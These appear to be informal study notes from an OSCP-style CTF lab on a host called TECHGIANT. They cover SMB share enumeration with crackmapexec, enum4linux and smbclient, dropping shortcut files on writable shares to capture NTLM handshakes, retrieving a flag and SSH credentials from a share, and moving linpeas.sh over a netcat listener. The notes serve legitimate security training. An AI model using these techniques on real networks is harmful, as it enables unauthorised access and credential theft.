# Cliente 
[Day 5](../Day%205.md)
- `IPC$` share is for devices to communicate, not useful
- `print$` may be useful
- `josephine` has read/write accessess to the share
	- How to use this?
	- First, drop icon or link files. Windows lets you create shortcuts where the icon is loaded from your server. Any time anyone browses to the directory Windows tries to load the icon file, resulting in **NET LTM** handshake
	- #slinky tool will find all the shares you have write access to and drop an icon. 
**He did something at 8:35 that got him access with the GUI
- then does `smbclient -L` to list the shares. 
- `smbclient //ipaddress/josephine`
- #crackmapexec (Allowed in OSCP)
	- specify protocol
	- target ip
	- **Great** info on the host name, a domain (if any)
	- #cmedb dumps the database of #crackmapexec 
	- `-L` to list modules
	- --shares excellent to enumerate the local shares
		- SHARES ARE KEY
```Bash
┌──(edward㉿kali)-[~]
└─$ sudo crackmapexec smb 10.50.153.56 --shares -u '' -p ''
SMB         10.50.153.56    445    TECHGIANT        [*] Windows 6.1 (name:TECHGIANT) (domain:) (signing:False) (SMBv1:True)
SMB         10.50.153.56    445    TECHGIANT        [+] \: 
SMB         10.50.153.56    445    TECHGIANT        [+] Enumerated shares
SMB         10.50.153.56    445    TECHGIANT        Share           Permissions     Remark                                  
SMB         10.50.153.56    445    TECHGIANT        -----           -----------     ------                                  
SMB         10.50.153.56    445    TECHGIANT        print$                          Printer Drivers                         
SMB         10.50.153.56    445    TECHGIANT        josephine       READ            Door                                    
SMB         10.50.153.56    445    TECHGIANT        IPC$                            IPC Service (techgiant server (Samba, Ubuntu))    
```
## Qasim
#nbstat lists shares
- techgiant
- -browse
- nmap version/os detection can be misleading. Always verify. Cliente does this, returns both Ubuntu and Windows
#activeinfogathering 
- Uses SMB
- Vunerable Host

Workgroup=WORKGROUP
NetBIO = TECHGIANT

Min pass length = 5

Via `enum4linux -r` 
- SID for root = S-1-5-21-3524850382-1584064342-660798973-1001

Via `enum4linux -U -d` for detailed user enumeration. RID for Root is `0x3e9`

```Bash
 ============================= 
|    Users on 10.50.153.56    |
 ============================= 
index: 0x1 RID: 0x3e9 acb: 0x00000010 Account: root     Name: root      Desc:
```

```Bash
smbclient -H 10.50.153.56
```

`Door` is the password for her smb share

```Bash
smbclient //10.50.153.56/josephine
```

Get the flag and message from her account with `GET`

The flag file contains the flag and the password for her SSH account

```
Flag1{Welcome_T0_THE-Tech-Giant-World}
user:josephine
password:door+open
```

And a new message file

```Bash
The first flag, base64 decoded
Dear Josephine ,
Am Sorry but i was lost my password ,
and i believe that you can reset  it for me . 
Thank You 
Jujhar
```

Login to her SSH account, and copy `linpeas.sh` from your local account with a `nc` listener, passing the file. Either direction works. 

